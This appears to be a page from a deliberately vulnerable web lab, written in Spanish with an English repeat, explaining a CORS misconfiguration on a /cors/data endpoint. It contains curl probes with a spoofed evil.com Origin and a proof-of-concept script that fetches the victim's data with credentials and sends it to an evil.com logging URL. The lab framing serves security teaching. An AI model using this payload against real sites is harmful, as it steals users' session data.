API de datos internos

La API devuelve datos sensibles y refleja cualquier cabecera Origin con Access-Control-Allow-Credentials: true.

# Endpoint vulnerable
GET /cors/data
# Probar con curl (observa las cabeceras CORS)
curl -H "Origin: https://evil.com" -I http://localhost:5000/cors/data
Respuesta:

    

  


  

    
PoC – Página maliciosa

    

      
<!-- evil.com/steal.html -->

      
<script>

      
fetch('http://victim.com/cors/data', {'{'}credentials:'include'{'}'})  

      
  .then(r => r.json())

      
  .then(d => fetch('https://evil.com/log?data='+JSON.stringify(d)));

      
</script>

    

  






  

    
Pasos de explotación

    
    
      
  1. Verifica la misconfiguration con curl: la respuesta refleja tu Origin en Access-Control-Allow-Origin junto con Access-Control-Allow-Credentials: true.
    2. 
      
  2. Esto permite a cualquier sitio malicioso leer la respuesta incluyendo cookies de sesión.
    3. 
      
  3. Crea una página HTML en tu servidor y usa fetch() con credentials: 'include'.
    4. 
      
  4. Si la víctima visita tu página mientras tiene sesión abierta en la app, robarás sus datos.
    5. 
    

    
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=VICTIM_SESSION" \
     http://localhost:5000/cors/data
# Observa: Access-Control-Allow-Origin: https://evil.com

Exploitation Steps

    
    
      
  1. Verify the misconfiguration with curl: the response reflects your Origin in Access-Control-Allow-Origin along with Access-Control-Allow-Credentials: true.
    2. 
      
  2. This allows any malicious site to read the response including session cookies.
    3. 
      
  3. Create an HTML page on your server and use fetch() with credentials: 'include'.
    4. 
      
  4. If the victim visits your page while logged in, their data will be stolen.
    5. 
    

    
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=VICTIM_SESSION" \
     http://localhost:5000/cors/data
# Notice: Access-Control-Allow-Origin: https://evil.com
